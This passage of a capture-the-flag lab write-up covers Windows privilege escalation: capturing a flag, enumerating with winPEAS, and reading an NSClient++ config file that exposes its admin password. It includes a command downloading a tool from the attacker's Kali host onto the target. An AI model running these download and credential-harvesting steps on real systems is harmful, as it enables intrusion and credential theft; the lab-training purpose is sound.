d-r--         7/26/2012   1:04 AM            Public                            
d----         11/4/2021   8:51 PM            svc-postgres     
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
     
I see a svc-postgres folder and that of the Administrtor. As a low privileged user I am of course not allowed to enter the folder of the Administrator. So I navigate to the folder svc-postgres and check which folders and files are present.        



~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
PS C:\Users> cd svc-postgres
PS C:\Users\svc-postgres> dir


    Directory: C:\Users\svc-postgres


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
d-r--         11/4/2021   9:42 PM            Desktop                           
d-r--         11/4/2021   1:49 PM            Documents                         
d-r--         7/26/2012   1:04 AM            Downloads                         
d-r--         7/26/2012   1:04 AM            Favorites                         
d-r--         7/26/2012   1:04 AM            Links                             
d-r--         7/26/2012   1:04 AM            Music                             
d-r--         7/26/2012   1:04 AM            Pictures                          
d----         7/26/2012   1:04 AM            Saved Games                       
d-r--         7/26/2012   1:04 AM            Videos 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                           
The default follders are present. Often there is a flag on the Desktop, so I decide to go there and see if the flag is there. 


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
PS C:\Users\svc-postgres> cd Desktop
PS C:\Users\svc-postgres\Desktop> dir


    Directory: C:\Users\svc-postgres\Desktop


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
-a---         11/4/2021   9:42 PM         38 flag.txt 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                         
The flag is on the svc-postgres desktop. For the OSCP exam you have to take a screenshot of the flag, the hostname and the IP information. This should all be visible in one screenshot.
For this I run the command **type flag.txt;hostname;ipconfig**, so that everything is displayed at once in my terminal. 



~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
PS C:\Users\svc-postgres\Desktop> type flag.txt;hostname;ipconfig
d131dd02c5e6eec4
WIN-KBP5VDTN99V

Windows IP Configuration


Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . : 
   Link-local IPv6 Address . . . . . : fe80::90cb:5535:6a9:2242%12
   IPv4 Address. . . . . . . . . . . : 10.0.2.27
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.0.2.1

Tunnel adapter isatap.{47B0B4BC-37CE-446E-8F43-E7FC1C32D075}:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : 
PS C:\Users\svc-postgres\Desktop> 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Now that I have captured the flag , I also want to know if there might be something configured wrong and I type the command **whoami /all**.

 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
PS C:\Users\svc-postgres\Desktop> whoami /all

USER INFORMATION
----------------

User Name                    SID                                           
============================ ==============================================
win-kbp5vdtn99v\svc-postgres S-1-5-21-3946822154-3476959638-2327897222-1003


GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes                                        
==================================== ================ ============ ==================================================
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level Label            S-1-16-12288 Mandatory group, Enabled by default, Enabled group


PRIVILEGES INFORMATION
----------------------

Privilege Name          Description              State  
======================= ======================== =======
SeChangeNotifyPrivilege Bypass traverse checking Enabled
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

I don't really notice anything that I think I could use to get more privileges.
A good time to use winPEAS. I want to download the file to a folder in which I have write permissions.
Often C:\Windows\Temp is a possibility within the Windows environment where you can temporarily store files.
I navigate to this folder to download winPeas there.


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
PS C:\Users\svc-postgres\Desktop> cd c:\windows
PS C:\windows> cd temp
PS C:\windows\temp> 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


On the target I'm ready to download winPEAS, but on my Kali machine I haven't set everything up yet.
I navigate to the folder where winPEAS is stored and I start my python web server. 

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
┌──(eMVee@kali)-[~/…/winPEASexe/binaries/x64/Release]
└─$ sudo python3 -m http.server 80 

[sudo] password for eMVee: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


I make sure that winPEAS.exe is downloaded on my target with the following command: **Invoke-WebRequest -Uri http://10.0.2.15/winPEASx64.exe -OutFile winPEASx64.exe**


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
PS C:\windows\temp> Invoke-WebRequest -Uri http://10.0.2.15/winPEASx64.exe -OutFile winPEASx64.exe
PS C:\windows\temp> 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

After executing the command I simultaneously see on my Kali machine that the file has been successfully downloaded by the target.


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
┌──(eMVee@kali)-[~/…/winPEASexe/binaries/x64/Release]
└─$ sudo python3 -m http.server 80 

[sudo] password for eMVee: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.0.2.27 - - [09/Nov/2021 14:08:57] "GET /winPEASx64.exe HTTP/1.1" 200 -

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Because winPEAS.exe is now downloaded on the target, I can run the file. I'm starting winPEAS as soon as possible, because I'm still looking for the right way for privilege escalation.


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
PS C:\windows\temp> ./winPEASx64.exe
ANSI color bit for Windows is not set. If you are execcuting this from a Windows terminal inside the host you should run 'REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1' and then start a new CMD
     
             *((,.,/((((((((((((((((((((/,  */                                                                      
      ,/*,..*((((((((((((((((((((((((((((((((((,                                                                    
    ,*/((((((((((((((((((/,  .*//((//**, .*(((((((*                                                                 
    ((((((((((((((((**********/########## .(* ,(((((((                                                              
    (((((((((((/********************/####### .(. (((((((                                                            
    ((((((..******************/@@@@@/***/###### ./(((((((                                                           
    ,,....********************@@@@@@@@@@(***,#### .//((((((                                                         
    , ,..********************/@@@@@%@@@@/********##((/ /((((                                                        
    ..((###########*********/%@@@@@@@@@/************,,..((((                                                        
    .(##################(/******/@@@@@/***************.. /((                                                        
    .(#########################(/**********************..*((                                                        
    .(##############################(/*****************.,(((                                                        
    .(###################################(/************..(((                                                        
    .(#######################################(*********..(((                                                        
    .(#######(,.***.,(###################(..***.*******..(((                                                        
    .(#######*(#####((##################((######/(*****..(((                                                        
    .(###################(/***********(##############(...(((                                                        
    .((#####################/*******(################.((((((                                                        
    .(((############################################(..((((                                                         
    ..(((##########################################(..(((((                                                         
    ....((########################################( .(((((                                                          
    ......((####################################( .((((((                                                           
    (((((((((#################################(../((((((                                                            
        (((((((((/##########################(/..((((((                                                              
              (((((((((/,.  ,*//////*,. ./(((((((((((((((.                                                          
                 (((((((((((((((((((((((((((((/                                                                     

ADVISORY: winpeas should be used for authorized penetration testing and/or educational purposes only.Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner's permission.                                                                         
                                                                                                                    
  WinPEASng by @carlospolopm, makikvues(makikvues2[at]gmail[dot]com)                                                

       /---------------------------------------------------------------------------\                                
       |                             Do you like PEASS?                            |                                
       |---------------------------------------------------------------------------|                                
       |         Become a Patreon    :     https://www.patreon.com/peass           |                                
       |         Follow on Twitter   :     @carlospolopm                           |                                
       |         Respect on HTB      :     SirBroccoli & makikvues                 |                                
       |---------------------------------------------------------------------------|                                
       |                                 Thank you!                                |                                
       \---------------------------------------------------------------------------/                                
                                                                                                                    
  [+] Legend:
         Red                Indicates a special privilege over an object or something is misconfigured
         Green              Indicates that some protection is enabled or something is well configured
         Cyan               Indicates active users
         Blue               Indicates disabled users
         LightYellow        Indicates links

? You can find a Windows local PE Checklist here: https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation                                                                                                            
   Creating Dynamic lists, this could take a while, please wait...
   - Loading YAML definitions file...
   - Checking if domain...
   - Getting Win32_UserAccount info...
   - Creating current user groups list...
   - Creating active users list (local only)...
   - Creating disabled users list...
   - Admin users list...
   - Creating AppLocker bypass list...
   - Creating files/directories list for search...


????????????????????????????????????? System Information ?????????????????????????????????????

???????????? Basic System Information
? Check if the Windows versions is vulnerable to some known exploit https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#kernel-exploits                                                                              
    Hostname: WIN-KBP5VDTN99V
    ProductName: Windows Server 2012 Datacenter
    EditionID: ServerDatacenter
    ReleaseId: 
    BuildBranch: 
    CurrentMajorVersionNumber: 
    CurrentVersion: 6.2
    Architecture: AMD64
    ProcessorCount: 4
    SystemLang: en-US
    KeyboardLang: English (United States)
    TimeZone: (UTC-08:00) Pacific Time (US & Canada)
    IsVirtualMachine: True
    Current Time: 11/9/2021 2:10:18 PM
    HighIntegrity: False
    PartOfDomain: False
    Hotfixes: KB2999226, 

  [?] Windows vulns search powered by Watson(https://github.com/rasta-mouse/Watson)

???????????? Showing All Microsoft Updates
  [X] Exception: Exception has been thrown by the target of an invocation.

???????????? System Last Shutdown Date/time (from Registry)
                                                                                                                    
    Last Shutdown Date/time        :    10/23/2021 12:07:08 AM

???????????? User Environment Variables
? Check for some passwords or keys in the env variables 
    COMPUTERNAME: WIN-KBP5VDTN99V
    USERPROFILE: C:\Users\svc-postgres
    PUBLIC: C:\Users\Public
    LOCALAPPDATA: C:\Users\svc-postgres\AppData\Local
    PSModulePath: C:\Users\svc-postgres\Documents\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules\
    PROCESSOR_ARCHITECTURE: AMD64
    CommonProgramW6432: C:\Program Files\Common Files
    CommonProgramFiles(x86): C:\Program Files (x86)\Common Files
    ProgramFiles(x86): C:\Program Files (x86)
    PROCESSOR_LEVEL: 6
    LC_MESSAGES: en
    ProgramFiles: C:\Program Files
    PATHEXT: .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.CPL
    PSExecutionPolicyPreference: Bypass
    SystemRoot: C:\Windows
    USERNAME: svc-postgres
    TMP: C:\Users\SVC-PO~1\AppData\Local\Temp
    ProgramData: C:\ProgramData
    ALLUSERSPROFILE: C:\ProgramData
    LC_CTYPE: English_United States.1252
    PROCESSOR_REVISION: 9e0a
    FP_NO_HOST_CHECK: NO
    APPDATA: C:\Users\svc-postgres\AppData\Roaming
    Path: C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\
    PGLOCALEDIR: C:/Program Files/PostgreSQL/9.6/share/locale
    LC_COLLATE: English_United States.1252
    PGSYSCONFDIR: C:/Program Files/PostgreSQL/9.6/etc
    PGDATA: C:/Program Files/PostgreSQL/9.6/data
    CommonProgramFiles: C:\Program Files\Common Files
    OS: Windows_NT
    PROCESSOR_IDENTIFIER: Intel64 Family 6 Model 158 Stepping 10, GenuineIntel
    ComSpec: C:\Windows\system32\cmd.exe
    PROMPT: $P$G
    SystemDrive: C:
    TEMP: C:\Users\SVC-PO~1\AppData\Local\Temp
    USERDOMAIN: WIN-KBP5VDTN99V
    NUMBER_OF_PROCESSORS: 4
    LC_MONETARY: C
    LC_TIME: C
    ProgramW6432: C:\Program Files
    windir: C:\Windows
    LC_NUMERIC: C

???????????? System Environment Variables
? Check for some passwords or keys in the env variables 
    FP_NO_HOST_CHECK: NO
    USERNAME: SYSTEM
    Path: C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\
    ComSpec: C:\Windows\system32\cmd.exe
    TMP: C:\Windows\TEMP
    OS: Windows_NT
    windir: C:\Windows
    PROCESSOR_ARCHITECTURE: AMD64
    TEMP: C:\Windows\TEMP
    PATHEXT: .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
    PSModulePath: C:\Windows\system32\WindowsPowerShell\v1.0\Modules\
    NUMBER_OF_PROCESSORS: 4
    PROCESSOR_LEVEL: 6
    PROCESSOR_IDENTIFIER: Intel64 Family 6 Model 158 Stepping 10, GenuineIntel
    PROCESSOR_REVISION: 9e0a

???????????? Audit Settings
? Check what is being logged 
    Not Found

???????????? Audit Policy Settings - Classic & Advanced

???????????? WEF Settings
? Windows Event Forwarding, is interesting to know were are sent the logs 
    Not Found

???????????? LAPS Settings
? If installed, local administrator password is changed frequently and is restricted by ACL 
    LAPS Enabled: LAPS not installed

???????????? Wdigest
? If enabled, plain-text crds could be stored in LSASS https://book.hacktricks.xyz/windows/stealing-credentials/credentials-protections#wdigest                                                                                         
    Wdigest is not enabled

???????????? LSA Protection
? If enabled, a driver is needed to read LSASS memory (If Secure Boot or UEFI, RunAsPPL cannot be disabled by deleting the registry key) https://book.hacktricks.xyz/windows/stealing-credentials/credentials-protections#lsa-protection
    LSA Protection is not enabled

???????????? Credentials Guard
? If enabled, a driver is needed to read LSASS memory https://book.hacktricks.xyz/windows/stealing-credentials/credentials-protections#credential-guard                                                                                 
    CredentialGuard is not enabled
  [X] Exception:   [X] 'Win32_DeviceGuard' WMI class unavailable

???????????? Cached Creds
? If > 0, credentials will be cached in the registry and accessible by SYSTEM user https://book.hacktricks.xyz/windows/stealing-credentials/credentials-protections#cached-credentials                                                  
    cachedlogonscount is 10

???????????? Enumerating saved credentials in Registry (CurrentPass)

???????????? AV Information
  [X] Exception: Object reference not set to an instance of an object.
    No AV was detected!!
    Not Found

???????????? Windows Defender configuration
  Local Settings
  Group Policy Settings

???????????? UAC Status
? If you are in the Administrators group check how to bypass the UAC https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#basic-uac-bypass-full-file-system-access                                                    
    ConsentPromptBehaviorAdmin: 5 - PromptForNonWindowsBinaries
    EnableLUA: 1
    LocalAccountTokenFilterPolicy: 
    FilterAdministratorToken: 0
      [*] LocalAccountTokenFilterPolicy set to 0 and FilterAdministratorToken != 1.
      [-] Only the RID-500 local admin account can be used for lateral movement.                                    

???????????? PowerShell Settings
    PowerShell v2 Version: 2.0
    PowerShell v5 Version: 3.0
    PowerShell Core Version: 
    Transcription Settings: 
    Module Logging Settings: 
    Scriptblock Logging Settings: 
    PS history file: 
    PS history size: 

???????????? Enumerating PowerShell Session Settings using the registry
      You must be an administrator to run this check

???????????? PS default transcripts history
? Read the PS history inside these files (if any)

???????????? HKCU Internet Settings
    User Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
    IE5_UA_Backup_Flag: 5.0
    ZonesSecurityUpgrade: System.Byte[]
    EnableNegotiate: 1
    ProxyEnable: 0

???????????? HKLM Internet Settings
    CodeBaseSearchPath: CODEBASE
    EnablePunycode: 1
    WarnOnIntranet: 1
    MinorVersion: 0
    ActiveXCache: C:\Windows\Downloaded Program Files

???????????? Drives Information
? Remember that you should search more info inside the other drives 
    C:\ (Type: Fixed)(Filesystem: NTFS)(Available space: 17 GB)(Permissions: Users [AppendData/CreateDirectories])
    D:\ (Type: CDRom)

???????????? Checking WSUS
?  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#wsus
    Not Found

???????????? Checking AlwaysInstallElevated
?  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated
    AlwaysInstallElevated isn't available

???????????? Enumerate LSA settings - auth packages included
                                                                                                                    
    Bounds                               :       00-30-00-00-00-20-00-00
    auditbasedirectories                 :       0
    fullprivilegeauditing                :       00
    crashonauditfail                     :       0
    auditbaseobjects                     :       0
    LimitBlankPasswordUse                :       1
    NoLmHash                             :       1
    Notification Packages                :       scecli,rassfm
    Security Packages                    :       kerberos,msv1_0,schannel,wdigest,tspkg,pku2u
    [!]      WDigest is enabled - plaintext password extraction is possible!
    Authentication Packages              :       msv1_0
    LsaPid                               :       496
    SecureBoot                           :       1
    ProductType                          :       8
    disabledomaincreds                   :       0
    everyoneincludesanonymous            :       1
    forceguest                           :       0
    restrictanonymous                    :       0
    restrictanonymoussam                 :       1

???????????? Enumerating NTLM Settings
  LanmanCompatibilityLevel    :  (Send NTLMv2 response only - Win7+ default)
                                                                                                                    

  NTLM Signing Settings                                                                                             
      ClientRequireSigning    : False
      ClientNegotiateSigning  : True
      ServerRequireSigning    : False
      ServerNegotiateSigning  : False
      LdapSigning             : Negotiate signing (Negotiate signing)

  Session Security                                                                                                  
      NTLMMinClientSec        : 536870912 (Require 128-bit encryption)
      NTLMMinServerSec        : 536870912 (Require 128-bit encryption)
                                                                                                                    

  NTLM Auditing and Restrictions                                                                                    
      InboundRestrictions     :  (Not defined)
      OutboundRestrictions    :  (Not defined)
      InboundAuditing         :  (Not defined)
      OutboundExceptions      : 

???????????? Display Local Group Policy settings - local users/machine

???????????? Checking AppLocker effective policy
   AppLockerPolicy version: 1
   listing rules:



???????????? Enumerating Printers (WMI)
      Name:                    Microsoft XPS Document Writer
      Status:                  Unknown
      Sddl:                    O:SYD:(A;;LCSWSDRCWDWO;;;LA)(A;OIIO;RPWPSDRCWDWO;;;LA)(A;OIIO;GA;;;CO)(A;OIIO;GA;;;AC)(A;;SWRC;;;WD)(A;CIIO;GX;;;WD)(A;;SWRC;;;AC)(A;CIIO;GX;;;AC)(A;;LCSWSDRCWDWO;;;BA)(A;OICIIO;GA;;;BA)
      Is default:              True
      Is network printer:      False

   =================================================================================================


???????????? Enumerating Named Pipes
  Name                                                                                                 Sddl

  eventlog                                                                                             O:LSG:LSD:P(A;;0x12019b;;;WD)(A;;CC;;;OW)(A;;0x12008f;;;S-1-5-80-880578595-1860270145-482643319-2788375705-1540778122)           
                                                                                                                    

???????????? Enumerating AMSI registered providers

???????????? Enumerating Sysmon configuration
      You must be an administrator to run this check

???????????? Enumerating Sysmon process creation logs (1)
      You must be an administrator to run this check

???????????? Installed .NET versions
                                                                                                                    
  CLR Versions
   4.0.30319

  .NET Versions                                                                                                     
   4.5.50709

  .NET & AMSI (Anti-Malware Scan Interface) support                                                                 
      .NET version supports AMSI     : False
      OS supports AMSI               : False


????????????????????????????????????? Interesting Events information ?????????????????????????????????????

???????????? Printing Explicit Credential Events (4648) for last 30 days - A process logged on using plaintext credentials                                                                                                              
                                                                                                                    
      You must be an administrator to run this check

???????????? Printing Account Logon Events (4624) for the last 10 days.
                                                                                                                    
      You must be an administrator to run this check

???????????? Process creation events - searching logs (EID 4688) for sensitive data.
                                                                                                                    
      You must be an administrator to run this check

???????????? PowerShell events - script block logs (EID 4104) - searching for sensitive data.
                                                                                                                    

???????????? Displaying Power off/on events for last 5 days
                                                                                                                    
  11/9/2021 11:42:05 AM   :  Unexpected Shutdown
  11/9/2021 11:41:49 AM   :  Startup
  11/8/2021 6:57:31 PM    :  Unexpected Shutdown
  11/8/2021 6:57:15 PM    :  Startup
  11/4/2021 5:07:43 PM    :  Unexpected Shutdown
  11/4/2021 5:07:16 PM    :  Startup


????????????????????????????????????? Users Information ?????????????????????????????????????

???????????? Users
? Check if you have some admin equivalent privileges https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#users-and-groups                                                                                            
  Current user: svc-postgres
  Current groups: Domain Users, Everyone, Users, Service, Console Logon, Authenticated Users, This Organization, Local, NTLM Authentication
   =================================================================================================

    WIN-KBP5VDTN99V\Administrator: Built-in account for administering the computer/domain
        |->Groups: Administrators
        |->Password: CanChange-Expi-Req

    WIN-KBP5VDTN99V\Guest: Built-in account for guest access to the computer/domain
        |->Groups: Guests
        |->Password: NotChange-NotExpi-NotReq

    WIN-KBP5VDTN99V\svc-postgres
        |->Groups: Users
        |->Password: CanChange-Expi-Req

PS C:\windows\temp> 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

When winPEAS is done, I scroll back up to see what was found. Some things are shown with colors. There are some points that are marked in red such as that the antivirus is not running. Good to know, but not something I can exploit right now.

I remember seeing a DevTools folder on the target and finding more ports in the nmap scan. Perhaps an internal service could be present.
With **netstat -ano** I get insight which ports are open and in use. 

The arguments are used to display the following information:
* -a            Displays all connections and listening ports.
* -n            Displays addresses and port numbers in numerical form.
* -o            Displays the owning process ID associated with each connection.


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
PS C:\windows\temp> 

netstat -ano

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       640
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       2216
  TCP    0.0.0.0:5432           0.0.0.0:0              LISTENING       1992
  TCP    0.0.0.0:5666           0.0.0.0:0              LISTENING       1224
  TCP    0.0.0.0:5666           0.0.0.0:0              LISTENING       1224
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:8080           0.0.0.0:0              LISTENING       1364
  TCP    0.0.0.0:8443           0.0.0.0:0              LISTENING       1224
  TCP    0.0.0.0:12489          0.0.0.0:0              LISTENING       1224
  TCP    0.0.0.0:12489          0.0.0.0:0              LISTENING       1224
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49152          0.0.0.0:0              LISTENING       396
  TCP    0.0.0.0:49153          0.0.0.0:0              LISTENING       704
  TCP    0.0.0.0:49154          0.0.0.0:0              LISTENING       788
  TCP    0.0.0.0:49155          0.0.0.0:0              LISTENING       496
  TCP    0.0.0.0:49158          0.0.0.0:0              LISTENING       488
  TCP    0.0.0.0:49159          0.0.0.0:0              LISTENING       2300
  TCP    10.0.2.27:139          0.0.0.0:0              LISTENING       4
  TCP    10.0.2.27:5432         10.0.2.15:55494        ESTABLISHED     1992
  TCP    10.0.2.27:49165        10.0.2.15:4455         ESTABLISHED     2288
  TCP    127.0.0.1:27017        0.0.0.0:0              LISTENING       1124
  TCP    [::]:135               [::]:0                 LISTENING       640
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:3389              [::]:0                 LISTENING       2216
  TCP    [::]:5432              [::]:0                 LISTENING       1992
  TCP    [::]:5666              [::]:0                 LISTENING       1224
  TCP    [::]:5985              [::]:0                 LISTENING       4
  TCP    [::]:12489             [::]:0                 LISTENING       1224
  TCP    [::]:47001             [::]:0                 LISTENING       4
  TCP    [::]:49152             [::]:0                 LISTENING       396
  TCP    [::]:49153             [::]:0                 LISTENING       704
  TCP    [::]:49154             [::]:0                 LISTENING       788
  TCP    [::]:49155             [::]:0                 LISTENING       496
  TCP    [::]:49158             [::]:0                 LISTENING       488
  TCP    [::]:49159             [::]:0                 LISTENING       2300
  UDP    0.0.0.0:500            *:*                                    788
  UDP    0.0.0.0:3389           *:*                                    2216
  UDP    0.0.0.0:4500           *:*                                    788
  UDP    0.0.0.0:5355           *:*                                    916
  UDP    0.0.0.0:63994          *:*                                    1224
  UDP    10.0.2.27:137          *:*                                    4
  UDP    10.0.2.27:138          *:*                                    4
  UDP    127.0.0.1:63993        *:*                                    1224
  UDP    [::]:500               *:*                                    788
  UDP    [::]:3389              *:*                                    2216
  UDP    [::]:4500              *:*                                    788
  UDP    [::]:5355              *:*                                    916
  UDP    [::1]:51061            *:*                                    1992
  UDP    [fe80::90cb:5535:6a9:2242%12]:546  *:*                        704
PS C:\windows\temp>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
In the list I see the IP address 127.0.0.1 a number of times and I see a number of ports that I had seen ok with the nmap scan, such as port 445, 5432 and 8443.
I save my scan data and go back to my nmap scan results. In the results I see indeed that port 8443 is used and that the title of the webagina is NSClient++.
I open the web page via the browser and I see a login page of NSClient++. 

![Image](/assets/img/WriteUp/ITSL/Back2Back/ITSL-Back2Back-3.png){: width="700" height="400" }

Via Google I searched for: "NSClient ++ exploit" and result redirected me to the website of [www.exploit-db.com](https://www.exploit-db.com/exploits/46802).
The exploit describes how I can perform privelage from a low privileged user to system user. 

First I navigated to the correct directory to see if I can find a password in the file "nsclient.ini". 

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
PS C:\windows\temp> cd c:\
PS C:\> dir


    Directory: C:\


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
d----         11/4/2021   8:17 PM            DevTools                          
d----         7/26/2012  12:44 AM            PerfLogs                          
d-r--         11/4/2021   9:17 PM            Program Files                     
d----         11/4/2021   8:02 PM            Program Files (x86)               
d----         11/4/2021  10:05 PM            Shares                            
d-r--         11/4/2021   1:49 PM            Users                             
d----         11/4/2021   8:17 PM            Windows                           


PS C:\> cd 'Program files'
PS C:\Program files> dir


    Directory: C:\Program files


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
d----         7/26/2012   1:04 AM            Common Files                      
d----         7/26/2012   1:06 AM            Internet Explorer                 
d----         11/2/2021   9:34 PM            MongoDB                           
d----         11/4/2021   9:17 PM            NSClient++                        
d----         11/3/2021   9:58 PM            PostgreSQL                        
d----         7/26/2012   1:05 AM            Windows Mail                      
d----         7/26/2012   1:04 AM            Windows NT                        


PS C:\Program files> cd NSClient++
PS C:\Program files\NSClient++> dir


    Directory: C:\Program files\NSClient++


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
d----         11/4/2021   9:17 PM            modules                           
d----         11/4/2021   9:17 PM            scripts                           
d----         11/4/2021   9:17 PM            security                          
d----         11/4/2021   9:17 PM            web                               
-a---         12/8/2015  11:17 PM      28672 boost_chrono-vc110-mt-1_58.dll    
-a---         12/8/2015  11:17 PM      50688 boost_date_time-vc110-mt-1_58.dll 
-a---         12/8/2015  11:17 PM     117760 boost_filesystem-vc110-mt-1_58.dll
-a---         12/8/2015  11:22 PM     439296 boost_program_options-vc110-mt-1_5
                                             8.dll                             
-a---         12/8/2015  11:23 PM     256000 boost_python-vc110-mt-1_58.dll    
-a---         12/8/2015  11:17 PM     765952 boost_regex-vc110-mt-1_58.dll     
-a---         12/8/2015  11:16 PM      19456 boost_system-vc110-mt-1_58.dll    
-a---         12/8/2015  11:18 PM     102400 boost_thread-vc110-mt-1_58.dll    
-a---         11/4/2021   9:17 PM         51 boot.ini                          
-a---         1/18/2018   2:51 PM     157453 changelog.txt                     
-a---         1/28/2018   9:33 PM    1210392 check_nrpe.exe                    
-a---         11/5/2017   8:09 PM     318464 Google.ProtocolBuffers.dll        
-a---         12/8/2015  10:16 PM    1655808 libeay32.dll                      
-a---         11/5/2017   9:04 PM      18351 license.txt                       
-a---         10/5/2017   7:19 AM     203264 lua.dll                           
-a---         11/4/2021   9:57 PM       1158 nsclient.ini                      
-a---         11/9/2021  11:50 AM       2937 nsclient.log                      
-a---         11/5/2017   8:42 PM      55808 NSCP.Core.dll                     
-a---         1/28/2018   9:32 PM    4765208 nscp.exe                          
-a---         11/5/2017   8:42 PM     483328 NSCP.Protobuf.dll                 
-a---        11/19/2017   3:18 PM     534016 nscp_json_pb.dll                  
-a---        11/19/2017   2:55 PM    2090496 nscp_lua_pb.dll                   
-a---         1/23/2018   7:57 PM     507904 nscp_mongoose.dll                 
-a---        11/19/2017   2:49 PM    2658304 nscp_protobuf.dll                 
-a---         11/5/2017   9:04 PM       3921 old-settings.map                  
-a---         11/5/2017   9:11 PM       3550 op5.ini                           
-a---         1/28/2018   9:21 PM    1973760 plugin_api.dll                    
-a---         5/23/2015   8:44 AM    3017216 python27.dll                      
-a---         9/27/2015   3:42 PM   28923515 python27.zip                      
-a---         1/28/2018   9:34 PM     384536 reporter.exe                      
-a---         12/8/2015  10:16 PM     348160 ssleay32.dll                      
-a---         5/23/2015   8:44 AM     689664 unicodedata.pyd                   
-a---         11/5/2017   8:20 PM    1273856 where_filter.dll                  
-a---         5/23/2015   8:44 AM      47616 _socket.pyd                       


PS C:\Program files\NSClient++> 

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


To view the file "nsclient.ini" I use the command **type nsclient.ini**. 

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
PS C:\Program files\NSClient++> type nsclient.ini
# If you want to fill this file with all available options run the following command:
#   nscp settings --generate --add-defaults --load-all
# If you want to activate a module and bring in all its options use:
#   nscp settings --activate-module <MODULE NAME> --add-defaults
# For details run: nscp settings --help


; in flight - TODO
[/settings/default]

; Undocumented key
password = NjoCYfnHSohg7Q6g

; Undocumented key
allowed hosts = 127.0.0.1


; in flight - TODO
[/settings/NRPE/server]

; Undocumented key
ssl options = no-sslv2,no-sslv3

; Undocumented key
verify mode = peer-cert

; Undocumented key
insecure = false


; in flight - TODO
[/modules]

; Undocumented key
CheckExternalScripts = disabled

; Undocumented key
CheckHelpers = disabled

; Undocumented key
CheckNSCP = disabled

; Undocumented key
CheckDisk = disabled

; Undocumented key
WEBServer = enabled

; Undocumented key
CheckSystem = disabled

; Undocumented key
NSClientServer = enabled

; Undocumented key
CheckEventLog = disabled

; Undocumented key
NSCAClient = enabled

; Undocumented key
NRPEServer = enabled
PS C:\Program files\NSClient++> 

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


In the file I saw the password and something else remarkable. The configuration file specifies that allowed hosts must contain the IP address 127.0.0.1. This would mean that I can't access it directly from my machine. I can set up a tunnel so that I can access it from my local machine. 

